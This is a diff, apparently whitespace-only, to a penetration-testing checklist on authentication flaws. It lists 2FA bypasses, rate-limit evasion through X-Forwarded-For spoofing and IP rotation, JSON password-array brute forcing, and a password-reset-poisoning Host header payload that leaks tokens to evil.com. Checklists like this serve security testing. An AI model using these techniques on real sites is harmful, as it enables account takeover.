@@ -27,10 +27,10 @@
 	- Test Remember me functionality
   - Test password reset and/or recovery
   - 2FA Bypass
-	  - Access the content directly (site.com/profile)
-	  - Login using Oauth gmail or FB to bypass 2FA
-	  - Reset Password and login inoto the account to bypass 2FA 
-	  - Use old toke or change the response
+    - Access the content directly (site.com/profile)
+    - Login using Oauth gmail or FB to bypass 2FA
+    - Reset Password and login inoto the account to bypass 2FA 
+    - Use old toke or change the response
   - Goto the reset password page and add two emails while sending the reset password link
 		[You can recive two password reset link]
   - Web Cache deception [site.com/profile/min.js]
@@ -39,13 +39,14 @@
   - Bypass rate limit protection: You can use IP-Rotate burp extension or you can change system IP per request.
 	
   - Password reset poisoning via dangling markup
-		Host: victim.com:'<a href="//evil.com/? Don't #">
+	Host: victim.com:'<a href="//evil.com/? Don't #">
 
   - Add X-Forwarded-For: 127.0.0.1 or 1-1000 to bypass the rate limit protection.
 
-  - Login into the valid account and then into valid one, repeat this process to fool the sever to bypass the rate limit protection (observe that your IP is blocked if your submit 3 incorrect logins in a row. However, you can reset the counter by logging in to your own account before the limit is reached)
+  - Login into the valid account and then into valid one, repeat this process to fool the sever to bypass the rate limit protection (observe that your IP is blocked        if your submit 3 incorrect logins in a row. However, you can reset the counter by logging in to your own account before the limit is reached)
 
   - replace the single string value of the password with an array of string containing all of the candidate passwords, for Example:
+	
 ```json
 	"username": "test",
 	"password": [
@@ -56,5 +57,5 @@
 	]
 ```
 
-	- If you enter the wrong code twice, you will be logged out again bypass it using macros (You need to use burp's session handlling features to log back in automatically before sending each request.)
+    - If you enter the wrong code twice, you will be logged out again bypass it using macros (You need to use burp's session handlling features to log back in automatically before sending each request.)
 	
